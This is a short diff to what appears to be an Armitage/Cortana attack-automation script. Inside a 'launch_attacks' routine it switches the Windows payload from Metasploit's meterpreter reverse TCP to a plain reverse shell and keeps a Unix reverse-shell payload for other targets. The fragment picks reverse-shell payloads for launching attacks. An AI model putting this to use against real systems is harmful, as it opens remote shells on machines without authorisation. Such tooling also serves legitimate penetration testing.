@@ -92,7 +92,8 @@ on launch_attacks {
 
 sub determinePayload {
    if ($1 == "windows") {
-      return "windows/meterpreter/reverse_tcp";
+      #return "windows/meterpreter/reverse_tcp";
+      return "windows/shell/reverse_tcp";
    }
    return "payload/cmd/unix/reverse";
 }
